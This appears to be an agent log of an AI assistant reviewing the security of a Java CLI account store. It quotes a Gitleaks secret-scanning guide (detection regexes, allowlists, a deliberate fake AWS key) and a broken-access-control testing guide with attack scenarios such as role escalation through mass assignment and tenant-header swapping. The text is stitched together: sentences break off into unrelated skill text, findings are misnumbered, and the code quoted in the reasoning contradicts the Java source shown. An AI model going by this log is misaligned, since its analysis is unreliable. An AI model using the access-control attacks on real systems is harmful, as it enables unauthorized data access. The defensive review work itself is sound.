refresh token rotation\n5. Add `iss` and `aud` claims validation to prevent token misuse across services\n```\n"}]}},{"type":"assistant","uuid":"7561adc9-ecac-4a51-966f-c2ce2c0a6123","session_id":"6c3718e7-90fb-4d04-8cf5-92ad0e5a8a59","parent_tool_use_id":null,"message":{"id":"7561adc9-ecac-4a51-966f-c2ce2c0a6123","type":"message","role":"assistant","model":"vllm-general","content":[{"type":"text","text":"This skill is JWT/API-centric, but its checklist applies to the *knowledge* of this codebase's authentication logic (the skill says to apply the knowledge to the code's language). It addresses configuring pre-commit hooks,\n  CI/CD pipeline integration, custom rule authoring for organization-specific secrets,\n  baseline management for existing repositories, and remediation workflows for exposed\n  credentials.\n\n  '\ndomain: cybersecurity\nsubdomain: devsecops\ntags:\n- devsecops\n- cicd\n- secret-scanning\n- gitleaks\n- pre-commit\n- secure-sdlc\nversion: 1.0.0\nauthor: mahipal\nlicense: Apache-2.0\nnist_csf:\n- PR.PS-01\n- GV.SC-07\n- ID.IM-04\n- PR.PS-04\nmitre_attack:\n- T1195\n- T1554\n- T1059.004\n- T1003\n- T1110\n---\n\n# Implementing Secret Scanning with Gitleaks\n\n## When to Use\n\n- When developers may accidentally commit API keys, passwords, tokens, or private keys to repositories\n- When establishing pre-commit gates that prevent secrets from entering the git history\n- When scanning existing repository history for previously committed secrets that need rotation\n- When compliance requirements mandate secret detection across all source code repositories\n- When migrating from manual secret audits to automated continuous scanning\n\n**Do not use** for detecting secrets in running applications or memory (use runtime secret detection), for managing secrets after detection (use Vault or AWS Secrets Manager), or for scanning container images (use Trivy or Grype).\n\n## Prerequisites\n\n- Gitleaks v8.18+ installed via binary, Go install, or Docker\n- Pre-commit framework installed for local hook integration\n- Git repository with history to scan\n- CI/CD platform access (GitHub Actions, GitLab CI, or equivalent)\n\n## Workflow\n\n### Step 1: Install and Run Initial Repository Scan\n\nPerform a baseline scan of the repository to identify all existing secrets in the git history.\n\n```bash\n# Install Gitleaks\nbrew install gitleaks  # macOS\n# or download binary from https://github.com/gitleaks/gitleaks/releases\n\n# Scan entire git history for secrets\ngitleaks detect --source . --report-format json --report-path gitleaks-report.json -v\n\n# Scan only staged changes (for pre-commit)\ngitleaks protect --staged --report-format json --report-path gitleaks-staged.json\n\n# Scan specific commit range\ngitleaks detect --source . --log-opts=\"HEAD~10..HEAD\" --report-format json\n\n# Scan without git history (filesystem only)\ngitleaks detect --source . --no-git --report-format json\n```\n\n### Step 2: Configure Pre-Commit Hook\n\nSet up Gitleaks as a pre-commit hook to prevent secrets from being committed.\n\n```yaml\n# .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/gitleaks/gitleaks\n    rev: v8.21.2\n    hooks:\n      - id: gitleaks\n        name: gitleaks\n        description: Detect hardcoded secrets using Gitleaks\n        entry: gitleaks protect --staged --verbose --redact\n        language: golang\n        pass_filenames: false\n```\n\n```bash\n# Install pre-commit framework\npip install pre-commit\n\n# Install hooks defined in .pre-commit-config.yaml\npre-commit install\n\n# Run against all files (not just staged)\npre-commit run gitleaks --all-files\n\n# Test the hook with a deliberate secret\necho 'AWS_SECRET_ACCESS_KEY=\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"' >> test.txt\ngit add test.txt\ngit commit -m \"test\"  # Should be blocked by gitleaks\n```\n\n### Step 3: Integrate into GitHub Actions\n\n```yaml\n# .github/workflows/secret-scanning.yml\nname: Secret Scanning\n\non:\n  push:\n    branches: [main, develop]\n  pull_request:\n    branches: [main]\n\njobs:\n  gitleaks:\n    name: Gitleaks Secret Scan\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0  # Full history for comprehensive scanning\n\n      - name: Run Gitleaks\n        uses: gitleaks/gitleaks-action@v2\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          GITLEAKS_LICENSE: ${{ secrets.GITLEAKS_LICENSE }}  # Required for gitleaks-action v2\n\n      # Alternative: Run Gitleaks directly\n      - name: Install Gitleaks\n        run: |\n          wget -q https://github.com/gitleaks/gitleaks/releases/download/v8.21.2/gitleaks_8.21.2_linux_x64.tar.gz\n          tar -xzf gitleaks_8.21.2_linux_x64.tar.gz\n          chmod +x gitleaks\n\n      - name: Scan for secrets\n        run: |\n          if [ \"${{ github.event_name }}\" == \"pull_request\" ]; then\n            ./gitleaks detect \\\n              --source . \\\n              --log-opts=\"${{ github.event.pull_request.base.sha }}..${{ github.event.pull_request.head.sha }}\" \\\n              --report-format sarif \\\n              --report-path gitleaks.sarif \\\n              --exit-code 1\n          else\n            ./gitleaks detect \\\n              --source . \\\n              --report-format sarif \\\n              --report-path gitleaks.sarif \\\n              --exit-code 1 \\\n              --baseline-path .gitleaks-baseline.json\n          fi\n\n      - name: Upload SARIF\n        if: always()\n        uses: github/codeql-action/upload-sarif@v3\n        with:\n          sarif_file: gitleaks.sarif\n          category: gitleaks\n```\n\n### Step 4: Author Custom Detection Rules\n\nCreate organization-specific rules for internal secret patterns.\n\n```toml\n# .gitleaks.toml\ntitle = \"Organization Gitleaks Configuration\"\n\n[extend]\nuseDefault = true  # Include all default rules\n\n# Custom rule for internal API tokens\n[[rules]]\nid = \"internal-api-token\"\ndescription = \"Internal API token for service-to-service auth\"\nregex = '''(?i)x-internal-token[\"\\s:=]+[\"\\']?([a-zA-Z0-9_\\-]{40,})[\"\\']?'''\nentropy = 3.5\nkeywords = [\"x-internal-token\"]\ntags = [\"internal\", \"api\"]\n\n[[rules]]\nid = \"database-connection-string\"\ndescription = \"Database connection string with embedded credentials\"\nregex = '''(?i)(postgres|mysql|mongodb|redis)://[^:]+:[^@]+@[^/]+/\\w+'''\nkeywords = [\"postgres://\", \"mysql://\", \"mongodb://\", \"redis://\"]\ntags = [\"database\", \"credentials\"]\n\n[[rules]]\nid = \"jwt-secret\"\ndescription = \"JWT signing secret\"\nregex = '''(?i)(jwt[_-]?secret|jwt[_-]?key)[\"\\s:=]+[\"\\']?([a-zA-Z0-9/+_\\-]{32,})[\"\\']?'''\nentropy = 3.0\nkeywords = [\"jwt_secret\", \"jwt-secret\", \"jwt_key\", \"jwt-key\"]\n\n# Allowlist for test files and known safe patterns\n[allowlist]\ndescription = \"Global allowlist\"\npaths = [\n  '''(^|/)test(s)?/''',\n  '''(^|/)spec/''',\n  '''\\.test\\.(js|ts|py)$''',\n  '''\\.spec\\.(js|ts|py)$''',\n  '''__mocks__/''',\n  '''fixtures/''',\n  '''(^|/)vendor/''',\n  '''node_modules/'''\n]\nregexes = [\n  '''EXAMPLE''',\n  '''example\\.com''',\n  '''test[-_]?(key|secret|token|password)''',\n  '''(?i)placeholder''',\n  '''000000+'''\n]\n```\n\n### Step 5: Manage Baselines for Existing Repositories\n\nCreate a baseline of known findings to avoid blocking development while historical secrets are being rotated.\n\n```bash\n# Generate baseline from current state\ngitleaks detect --source . --report-format json --report-path .gitleaks-baseline.json\n\n# Subsequent scans compare against baseline (only new findings trigger failures)\ngitleaks detect --source . --baseline-path .gitleaks-baseline.json --exit-code 1\n\n# Review baseline periodically and remove entries as secrets are rotated\ncat .gitleaks-baseline.json | python3 -m json.tool | head -50\n```\n\n### Step 6: Remediate Exposed Secrets\n\nWhen a secret is detected, follow the rotation and history cleanup procedure.\n\n```bash\n# 1. Immediately rotate the exposed credential\n#    - Revoke the old API key/token in the service provider\n#    - Generate a new credential\n#    - Store the new credential in a secrets manager\n\n# 2. Remove secret from git history using git-filter-repo\npip install git-filter-repo\n\n# Create expressions file for secrets to remove\ncat > /tmp/expressions.txt << 'EOF'\nregex:AKIA[0-9A-Z]{16}==>REDACTED_AWS_KEY\nregex:(?i)password\\s*=\\s*\"[^\"]*\"==>password=\"REDACTED\"\nEOF\n\ngit filter-repo --replace-text /tmp/expressions.txt --force\n\n# 3. Force-push the cleaned history (coordinate with team)\n# git push --force --all  # WARNING: Requires team coordination\n\n# 4. Add the secret pattern to .gitleaks.toml rules\n# 5. Update the baseline file to remove the resolved finding\n```\n\n## Key Concepts\n\n| Term | Definition |\n|------|------------|\n| Secret | Any credential, token, key, or sensitive string that should not appear in source code |\n| Pre-commit Hook | Git hook that runs before a commit is created, blocking commits containing detected secrets |\n| Entropy | Measure of randomness in a string; high-entropy strings are more likely to be secrets |\n| Baseline | Snapshot of existing findings used to differentiate new secrets from pre-existing ones |\n| Allowlist | Configuration specifying paths, patterns, or commits to exclude from detection |\n| SARIF | Static Analysis Results Interchange Format for uploading findings to security dashboards |\n| git-filter-repo | Tool for rewriting git history to remove sensitive data from all commits |\n\n## Tools & Systems\n\n- **Gitleaks**: Open-source secret detection tool supporting pre-commit hooks, CI/CD, and historical scanning\n- **pre-commit**: Framework for managing and maintaining multi-language pre-commit hooks\n- **git-filter-repo**: History rewriting tool for removing secrets from git history\n- **TruffleHog**: Alternative secret scanner with verified secret detection capabilities\n- **GitHub Secret Scanning**: Native GitHub feature that detects secrets matching partner patterns\n\n## Common Scenarios\n\n### Scenario: Onboarding Secret Scanning on a Legacy Repository\n\n**Context**: A 5-year-old repository has never been scanned. The team needs to enable secret scanning without blocking all development while historical secrets are rotated.\n\n**Approach**:\n1. Run `gitleaks detect` against full history and generate a baseline JSON file\n2. Triage each finding: classify as active (needs rotation), inactive (already rotated), or false positive\n3. Immediately rotate all active secrets and update consuming services\n4. Commit the baseline file (excluding active secrets that have been fixed)\n5. Enable pre-commit hooks for new development immediately\n6. Add CI/CD scanning with the baseline to catch only new secrets\n7. Progressively reduce the baseline as historical secrets are rotated\n\n**Pitfalls**: Generating a baseline without triaging means accepting risk on unrotated secrets. Never assume a historical secret is inactive without verifying with the service provider. Running git-filter-repo on a shared repository without coordination will cause rebase conflicts for all team members.\n\n## Output Format\n\n```\nGitleaks Secret Scanning Report\n=================================\nRepository: org/web-application\nScan Type: Full History\nCommits Scanned: 4,523\nDate: 2026-02-23\n\nFINDINGS:\n  Total: 12\n  New (not in baseline): 3\n  Baseline (pre-existing): 9\n\nNEW FINDINGS (blocking):\n  [1] AWS Access Key ID\n      Rule: aws-access-key-id\n      File: src/config/aws.py:23\n      Commit: a1b2c3d (2026-02-22, dev@company.com)\n      Secret: AKIA...REDACTED\n      Entropy: 3.8\n\n  [2] GitHub Personal Access Token\n      Rule: github-pat\n      File: scripts/deploy.sh:15\n      Commit: d4e5f6g (2026-02-21, ops@company.com)\n      Secret: ghp_...REDACTED\n      Entropy: 4.2\n\n  [3] Internal API Token\n      Rule: internal-api-token\n      File: src/services/auth.py:89\n      Commit: h7i8j9k (2026-02-20, dev@company.com)\n\nQUALITY GATE: FAILED (3 new findings)\nAction: Rotate exposed credentials immediately.\n```\n"}]}},{"type":"assistant","uuid":"ac320071-287a-4fd4-ab59-9ac0b5bfc4b6","session_id":"6c3718e7-90fb-4d04-8cf5-92ad0e5a8a59","parent_tool_use_id":null,"message":{"id":"ac320071-287a-4fd4-ab59-9ac0b5bfc4b6","type":"message","role":"assistant","model":"vllm-general","content":[{"type":"text","text":"Gitleaks knowledge: hardcoded secrets, high-entropy strings, test paths in the allowlist. should not access another's data\n- When assessing API endpoints for missing or inconsistent authorization checks\n- During security audits where privilege escalation and unauthorized access are primary concerns\n\n## Prerequisites\n\n- **Authorization**: Written penetration testing agreement for the target\n- **Burp Suite Professional**: With Authorize extension for automated access control testing\n- **Multiple test accounts**: Accounts at each role level (admin, manager, user, guest)\n- **Application role matrix**: Documentation of what each role should and should not access\n- higher-privilege functionality (user -> admin) |\n| **Horizontal Privilege Escalation** | User accessing another user's resources at the same privilege level |\n| **Function-Level Access Control** | Authorization checks on specific features/functions regardless of URL |\n| **RBAC** | Role-Based Access Control - permissions assigned to roles, roles assigned to users |\n| **ABAC** | Attribute-Based Access Control - permissions based on user/resource/environment attributes |\n| **Multi-Tenant Isolation** | Ensuring data and functionality separation between different organizations/tenants |\n| **Insecure Direct Object Reference** | Accessing objects by manipulating identifiers without authorization checks |\n| **Missing Function-Level Check** | Endpoint exists but does not verify the caller has permission to invoke it |\n\n## Tools & Systems\n\n| Tool | Purpose |\n|------|---------|\n| **Burp Suite Professional** | Request interception and role-based testing |\n| **Authorize (Burp Extension)** | Automated access control testing across sessions |\n| **AutoRepeater (Burp Extension)** | Automatically replays requests with different auth contexts |\n| **Postman** | API testing with environment switching between roles |\n| **ffuf** | Discovering hidden endpoints that may lack access controls |\n| **OWASP ZAP** | Access control testing with context-aware scanning |\n\n## Common Scenarios\n\n### Scenario 1: Admin Panel Without Auth Check\nThe `/admin/dashboard` endpoint returns the admin panel when accessed with a regular user's session token. The front-end hides the admin menu, but the back-end does not enforce role checks.\n\n### Scenario 2: API Endpoint Missing Authorization\nThe `DELETE /api/users/{id}` endpoint checks for authentication (valid token) but not authorization (admin role). Any authenticated user can delete any other user's account.\n\n### Scenario 3: Tenant Data Leakage\nA SaaS application uses `tenant_id` in API request headers. Changing the `X-Tenant-ID` header to another tenant's ID returns their data, bypassing tenant isolation.\n\n### Scenario 4: Mass Assignment Role Escalation\nThe user profile update endpoint at `PUT /api/users/{id}` accepts a `role` field in the JSON body. Submitting `\"role\":\"admin\"` alongside a profile update elevates the user to administrator.\n\n## Output Format\n\n```\n## Broken Access Control Assessment Report\n\n**Target**: target.example.com\n**Assessment Date**: 2024-01-15\n**OWASP Category**: A01:2021 - Broken Access Control\n\n### Access Control Matrix Results\n| Endpoint | Admin | Manager | User | Guest | Expected | Actual |\n|----------|-------|---------|------|-------|----------|--------|\n| GET /admin/dashboard | 200 | 200 | 200 | 302 | Admin only | FAIL |\n| DELETE /api/users/{id} | 200 | 200 | 200 | 401 | Admin only | FAIL |\n| GET /api/users/other/profile | 200 | 200 | 200 | 401 | Own only | FAIL |\n| PUT /api/users/other/settings | 200 | 200 | 200 | 401 | Own only | FAIL |\n| GET /api/org/other-tenant | 200 | 200 | 200 | 401 | Same tenant | FAIL |\n\n### Critical Findings\n1. **Vertical Escalation**: Regular users can access /admin/* endpoints\n2. **Horizontal IDOR**: Users can read/modify other users' profiles\n3. **Tenant Isolation**: Cross-tenant data access via header manipulation\n4. **Mass Assignment**: Role escalation via profile update endpoint\n\n### Impact\n- Complete administrative access for any authenticated user\n- Full user data access across all accounts (15,000+ users)\n- Cross-tenant data breach affecting 200+ organizations\n- Account takeover via profile modification\n\n### Recommendation\n1. Implement server-side authorization checks on every endpoint\n2. Use a centralized authorization middleware/framework\n3. Enforce object-level authorization (verify ownership before access)\n4. Validate tenant context server-side, never from client headers\n5. Use allowlists for mass assignment (only permit expected fields)\n6. Implement audit logging for all access control decisions\n```\n"}]}},{"type":"assistant","uuid":"79c46633-9f93-439d-b922-fd57b4eabd5d","session_id":"6c3718e7-90fb-4d04-8cf5-92ad0e5a8a59","parent_tool_use_id":null,"message":{"id":"79c46633-9f93-439d-b922-fd57b4eabd5d","type":"message","role":"assistant","model":"vllm-general","content":[{"type":"text","text":"The broken access control skill is aimed at HTTP endpoints, and this CLI has no HTTP surface — but the mapping to *local file access control* is as follows:\n\n1. **Store file permissions (600)** — enforced at creation (store file, temp file); not applied to existing files (documented behavior). ✅\n2. **Symlink following** — NOFOLLOW_LINKS on load and move. ✅\n3. **Unprivileged access**: `list`/`exists` are readable only if the process can read the file — 600 restricts to owner. On a multi-user machine, other local users cannot read the store. ✅\n4. **Horizontal privilege escalation analog**: one process reading another user's store — prevented by 600 (at creation). But: if an attacker who owns the file has already written the store file (e.g., via a shared store path from an environment variable, or an attacker placing a store file at a path the victim specifies — `--store /shared/store`), `saveAll` overwrites with the attacker's existing permissions... no wait, the attacker's file would be attacker-owned 644. The victim's data goes in there, and the attacker can read it! The code does not verify ownership of an existing file before writing. Hmm, is this worth pointing out? Scenario: the victim runs `--store ~/store`, the attacker can't write there (home is 755 → can't write to the victim's home). `~/.secure-accounts/store` default — the victim's home subdirectory, no problem. Attacker-controlled shared path: the victim would have to pass the attacker's path — in which case it's self-inflicted, and 600 would be applied... no wait: saveAll writes to a temp file (created new, 600, victim-owned) and then does Files.move REPLACE_EXISTING — move replaces the attacker's file with the victim's 600 victim-owned temp file. So the attacker loses access; the victim's data is protected. Actually good.\n   The reverse: the victim runs --store /tmp/shared/store, where the attacker has pre-placed a valid-format file with entries — loadAll loads the attacker's accounts, and the victim authenticates against them (login to the attacker's store). This is a trust issue with the path chosen, inherent to an option that lets the user choose an arbitrary path. Minor/edge case; note as an observation: a world-writable directory containing a pre-placed store could be loaded (CWE-363/CWE-377 class). If the directory is world-writable and contains an existing store file, there is no ownership check on the store file itself at load time. Actually wait — the 600 check at creation applies only to new files. If the store already exists (attacker-created, 666) and the victim opens it, loadAll happily reads it. On load, the file contents (password hashes + usernames) are read into memory, and the store file itself... the victim can't even read a 666 file? If it's 666, yes. The attacker planted a store; the victim's login succeeds/fails against the attacker's accounts. Information: the attacker learns the victim's username attempts (they control the file, and can add a log... can't modify after the victim opens it — no, they can, the file is theirs; but loadAll has already read it; race). This is a far-fetched local-CLI scenario; include it as a low/informational observation about missing ownership verification of an existing store file (defense in depth), with a clear threat-model caveat.\n5. **Mass assignment analog**: parseLine rejects unknown fields — ✅ (no unknown fields accepted).\n6. **Function-level**: every operation goes through lock + service — ✅.\n\nNow, CWE assignments for the final findings:\n\nF1. No brute-force protection (no lockout/rate limit on `authenticate`) — CWE-307 (Improper Restriction of Excessive Authentication Attempts). Severity: low (local CLI; KDF cost is the main deterrent; an online attacker is outperformed by an offline attack). Evidence: AccountService.authenticate lines 61–78 — no throttling. Tests also assert \"uniform error message\" but not throttling. Recommend adding optional lockout, or documenting as accepted risk.\n\nF2. Timing difference between unknown user vs. empty password (CWE-208 Observable Timing Discrepancy / CWE-204 Information Exposure): the unknown-user path burns ~400ms, but the known-user + empty password path throws immediately. An attacker probing usernames with an empty password can distinguish known from unknown. Severity: low (requires calling authenticate with empty password; local context). Hmm wait — let me double-check: for a known user with an empty password, the code throws IllegalArgumentException(\"password must not be empty\") — a different exception type and a different exit path (the main login only catches UsernameMismatchException; the IllegalArgumentException propagates → exit 1 with stack trace?). In main's `login()`: `service.authenticate(...)` — if an IAE is thrown it propagates out of run() → caught? In main(): try { code = run(...) } catch (RuntimeException e) { out.err.println(\"error: \" + e.getMessage()); return 1; }. So an empty-password login outputs \"error: password must not be empty\" for a known user, and \"error: authentication failed\" for an unknown user. Two things: (a) distinguishable messages for known vs. unknown user with empty password (breaks uniformity); (b) timing difference (no burnTime on the known+empty path). Actually wait — for a known user with empty password, is burnTime skipped? Code:\n```java\nAccount account = lock.withLock(() -> accounts.get(username));\nif (account == null) { hasher.burnTime(dummySecret()); throw new UsernameMismatchException(BAD_CREDENTIALS); }\nif (password == null || password.length == 0) throw new IllegalArgumentException(\"password must not be empty\");\nif (!hasher.matches(password, account.passwordHash())) throw new UsernameMismatchException(BAD_CREDENTIALS);\n```\nYes: known user + empty password → immediate IAE, no KDF. Unknown user + empty password → burnTime (~400ms) + XME. So an attacker enumerating usernames can send an empty password and measure: fast + \"password must not be empty\" = exists; slow + \"authentication failed\" = does not exist. A genuine account enumeration oracle. This is a real, concrete finding: the design explicitly states the goal \"indistinguishable from wrong password\" and \"an unknown user is made to take as long as a real login\" — and the empty-password path violates that. Severity: low-to-medium (the code's own stated security property is broken; local CLI context). CWE: CWE-208 (Observable Timing Discrepancy) and/or CWE-204 (Observable Discrepancy). Assign CWE-208 as primary with CWE-204 noted.\n\nHmm wait, let me double-check the test `failureMessageIsUniform`: it asserts the message for unknown user (with real password) equals the message for wrong password. Both go through XME BAD_CREDENTIALS — passes. The empty-password case isn't tested. And the timing test `unknownUserDoesNotRevealWhetherTheAccountExists`: ratio between unknown user (burnTime) and wrong password (real derivation) — passes. Registration accepts arbitrarily weak passwords (no minimum length/complexity policy) — CWE-521 (Weak Password Requirements Specified) / CWE-798. register only rejects null/empty/>1024. A 1-character password is accepted and stored. Severity: low (a local store where the owner chooses the password; still a policy gap for a library that otherwise enforces a strong KDF). The skill (auth weaknesses) calls out a weak password policy. Recommend a minimum length (e.g., 8/12) or documented opt-out.\n\nF4. The store path is client-controllable + existing file not verified for ownership — observation/low (CWE-363/377 class). Only if an attacker can pre-place a store file in a directory the victim specifies, the CLI loads attacker-controlled account data (and the victim's subsequent login is checked against it). Not exploitable with the default path. Include as low/informational.\n\nF5. Verifier printed to stdout on registration (CWE-532 Information Exposure Through Data Written to a Log File / or CWE-359 exposure through output). The code's comment frames this as intentional and safe (\"not the password, not reversible\"). Is that right? A verifier is a PBKDF2 output with salt; it's equivalent to the hash in the store — anyone who obtains it gets exactly the same offline cracking target as the store file. Printing it to the terminal is a mild leak (terminal scrollback, logs, pipe to a file). Severity: informational/low. The skill's \"secrets logged\" item covers this: the hash is not a secret by the design, but writing the verifier to stdout means it lands in shell history (no — only stdin goes to history, not stdout), terminal log/scrollback, or if stdout is redirected (e.g., `secure-account register > out.txt`), the verifier ends up in a plaintext file. Low. Recommendation: print only a truncated form, or omit by default with a --show-verifier flag.\n\nF6. `dummySecret()` is a hardcoded string — by design; not a finding (mention in the secrets section).\n\nF7. Tests' `tempDir()` creates a shared directory in /tmp with default permissions, and `storePath` uses a random UUID subdirectory; files are 600. The directory /tmp/secureaccount-tests is world-readable, but the contents are protected by 600. Not a finding.\n\nAlso check: `AccountStore.lock()`'s sidecar `<store>.lock` — created with default permissions (644) — no secret in it (advisory lock), but if world-writable... the lock file itself: could an attacker delete/replace the lock file and break mutual exclusion? FileChannel.open(...CREATE) — if an attacker swaps the lock file for a symlink... it's opened with NOFOLLOW? The lock() channel open does **not** use NOFOLLOW_LINKS:\n```java\nFileChannel channel = FileChannel.open(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE);\n```\nIf an attacker replaces store.lock with a symlink to a file elsewhere, lock() opens via the symlink (follows it) and locks the *target* file — the victim's process locks a file the attacker controls; two victims could end up locking the same attacker-controlled target → mutual exclusion breaks → race in saveAll (two processes writing to the temp file simultaneously; the final move wins). Data integrity issue, not confidentiality. Local multi-user attack, requires write access to the store's parent directory — which means the attacker could do worse things (delete the store). So severity: informational/low. Include as low: the lock file is opened without NOFOLLOW_LINKS and without an ownership check — CWE-363 (Alternative Path Used) / CWE-59 (Symlink Following). A good find worth including as low.\n\nWait, also `sweepTempFiles` deletes `<store>*.tmp` — including temp files from *other* processes that use a store name as a prefix? The temp name is store + \"-\" + random(8) + \".tmp\" — could a different store name share the prefix: store \"s\" and store \"s2\"? temp for \"s2\" = \"s2-xxxx.tmp\"; does it start with \"s\"? \"s2-...\" starts with \"s\" → yes, sweepTempFiles(\"s\" store) deletes \"s2-....tmp\" if it starts with storeName. So two concurrently-running CLIs with store paths whose names are prefixes of each other in the same directory could delete each other's in-progress temp files → a crashed mid-write state... but the real store is only replaced by the move; temp deletion does not corrupt the real store. Worst case: process B's temp file is deleted after B's force, before B's move → B's move fails with NoSuchFileException → B errors out. A DoS against a concurrent CLI instance. Low. Worth mentioning as part of the lock finding, or as its own low item. For an unknown user, burnTime. For a *malformed* stored hash (a corrupt record), decode throws IAE — the message \"malformed password record\" leaks the fact that the account exists (the message differs from BAD_CREDENTIALS)! Look at authenticate:\n```java\nif (!hasher.matches(password, account.passwordHash())) throw XME(BAD_CREDENTIALS);\n```\nIf account.passwordHash() is malformed, matches → decode → IAE(\"malformed password record\") — propagates out of authenticate, out of the withLock (no catch), out of authenticate() in main → caught by main()'s catch(RuntimeException) → \"error: malformed password record\". So for a known user with a corrupt record: \"error: malformed password record\" (fast, no KDF); unknown user: \"authentication failed\" (slow). Another enumeration oracle — but only if the store is corrupt, which shouldn't happen (the loader validates hashes: loadAll calls validateStoredHash and throws at load time on malformed). Since loadAll rejects a malformed store wholesale (the CLI fails before doing anything), a malformed record can never coexist with a known user at login time... unless a concurrent process is mid-write? saveAll is atomic (move), so the on-disk store is always complete. Therefore the malformed-hash path in authenticate is unreachable in practice. I'll note as an observation rather than a finding: authenticate lets decode exceptions from matches() propagate, which (a) could leak the existence of the account and (b) skips the KDF timing equalization; currently unreachable because loadAll validates records, but fragile — a future change (e.g., per-record leniency) would re-introduce the oracle. CWE-208/CWE-209 (Information Exposure Through Error Message), defensive recommendation: catch IAE from matches and return BAD_CREDENTIALS after burnTime. This is a good \"defense in depth\" finding, severity low/medium. The store is written exclusively through\n * {@link PasswordHasher#hash(char[])}, so no code path can persist a password.\n */\npublic final class AccountService {\n\n    /**\n     * Returned for every failed login, whether the username is unknown or the password is\n     * merely wrong. Distinguishing the two turns the login form into an account-enumeration\n     * oracle, which is enough on its own to harvest a user list.\n     */\n    public static final String BAD_CREDENTIALS = \"authentication failed\";\n\n    private final AccountStore store;\n    private final PasswordHasher hasher;\n    private final Clock clock;\n\n    public AccountService(AccountStore store, PasswordHasher hasher) {\n        this(store, hasher, Clock.systemUTC());\n    }\n\n    public AccountService(AccountStore store, PasswordHasher hasher, Clock clock) {\n        this.store = store;\n        this.hasher = hasher;\n        this.clock = clock;\n    }\n\n    /**\n     * Creates an account for {@code username} protected by {@code password}.\n     *\n     * @param username 3-32 characters of {@code a-z 0-9 . _ -}, matched case-insensitively\n     * @return the created account, whose {@link Account#passwordHash()} is the verifier\n     * @throws IllegalArgumentException  for an unusable username or password\n     * @throws UsernameAlreadyTakenException when the name is registered\n     */\n    public Account register(String username, char[] password) throws IOException {\n        String canonical = Account.canonicalUsername(username);\n        if (canonical == null) {\n            throw new IllegalArgumentException(\n                    \"username must be 3-32 characters using a-z, 0-9, '.', '_' or '-'\");\n        }\n        if (password == null || password.length == 0) {\n            throw new IllegalArgumentException(\"password must not be empty\");\n        }\n        if (password.length > PasswordHasher.MAX_PASSWORD_CHARS) {\n            throw new IllegalArgumentException(\n                    \"password must be at most \" + PasswordHasher.MAX_PASSWORD_CHARS + \" characters\");\n        }\n        return underLock(accounts -> {\n            if (accounts.containsKey(canonical)) {\n                throw new UsernameAlreadyTakenException(canonical);\n            }\n            String hash = hasher.hash(password);\n            Account account = new Account(canonical, hash, Instant.now(clock));\n            accounts.put(canonical, account);\n            store.saveAll(accounts);\n            return account;\n        });\n    }\n\n    /**\n     * Checks a password against the stored verifier and, on success, transparently rehashes it\n     * if the stored parameters are weaker than the current policy.\n     *\n     * <p>Rehashing at login is what keeps a password database from ageing badly: the\n     * iteration count can be raised whenever hardware gets faster and accounts migrate on their\n     * own, without a password reset.\n     *\n     * @return {@code true} when the credentials are valid\n     * @throws AuthenticationFailedException with {@link #BAD_CREDENTIALS} otherwise\n     */\n    public boolean authenticate(String username, char[] password) throws IOException {\n        String canonical = Account.canonicalUsername(username);\n        if (canonical == null) {\n            // Same shape and cost as the \"unknown user\" answer below, so an invalid name is\n            // not a cheap way to tell malformed input apart from a real account.\n            hasher.burnTime(dummySecret());\n            throw new AuthenticationFailedException(BAD_CREDENTIALS);\n        }\n        Account account = underLock(accounts -> accounts.get(canonical));\n        if (account == null) {\n            // Derive a throwaway verifier so that \"unknown user\" and \"wrong password\" cost the\n            // same wall-clock time and a timing difference cannot enumerate accounts either.\n            hasher.burnTime(dummySecret());\n            throw new AuthenticationFailedException(BAD_CREDENTIALS);\n        }\n        if (password == null || password.length == 0) {\n            throw new AuthenticationFailedException(BAD_CREDENTIALS);\n        }\n        if (!hasher.matches(password, account.passwordHash())) {\n            throw new AuthenticationFailedException(BAD_CREDENTIALS);\n        }\n        if (hasher.needsUpgrade(account.passwordHash())) {\n            underLock(accounts -> {\n                Account current = accounts.get(canonical);\n                // Re-check under the lock: another login may have upgraded it already, in which\n                // case re-writing would only churn the file.\n                if (current != null && hasher.needsUpgrade(current.passwordHash())) {\n                    accounts.put(canonical, current.withPasswordHash(hasher.hash(password)));\n                    store.saveAll(accounts);\n                }\n                return Boolean.TRUE;\n            });\n        }\n        return true;\n    }\n\n    /** Runs {@code body} against the freshly loaded store while holding the exclusive lock. */\n    private <T> T underLock(StoreOp<T> body) throws IOException {\n        AccountStore.LockHandle handle = store.lock();\n        try {\n            return body.apply(store.loadAll());\n        } finally {\n            handle.close();\n        }\n    }\n\n    @FunctionalInterface\n    private interface StoreOp<T> {\n        T apply(Map<String, Account> accounts) throws IOException;\n    }\n\n    /**\n     * Whether {@code username} has an account.\n     *\n     * <p>Deliberately not reachable from {@link #authenticate}: this is for the CLI's own\n     * pre-flight, and a login failure stays uniform.\n     */\n    public boolean exists(String username) throws IOException {\n        String canonical = Account.canonicalUsername(username);\n        if (canonical == null) {\n            return false;\n        }\n        return store.loadAll().containsKey(canonical);\n    }\n\n    /** An immutable view of registered usernames and when they were created. */\n    public Map<String, Instant> listAccounts() throws IOException {\n        Map<String, Account> accounts = store.loadAll();\n        Map<String, Instant> out = new TreeMap<>();\n        accounts.forEach((name, account) -> out.put(name, account.createdAt()));\n        return Collections.unmodifiableMap(out);\n    }\n\n    /** Where credentials live, for display by the CLI. */\n    public Path storePath() {\n        return store.file();\n    }\n\n    /** A fixed secret used only to consume the same CPU as a genuine derivation. */\n    private static char[] dummySecret() {\n        return \"timing-equaliser-not-a-secret-0123456789\".toCharArray();\n    }\n\n    /** Thrown by {@link AccountService#register} when the name is taken. */\n    public static final class UsernameAlreadyTakenException extends IOException {\n        private static final long serialVersionUID = 1L;\n        private final String username;\n\n        UsernameAlreadyTakenException(String username) {\n            super(\"username '\" + username + \"' is already registered\");\n            this.username = username;\n        }\n\n        public String username() {\n            return username;\n        }\n    }\n\n    /** Thrown by {@link }\n    }\n\n    static String format(Account account) {\n        return \"username=\" + account.username()\n                + \" salted_pbkdf2_sha256=\" + account.passwordHash()\n                + \"
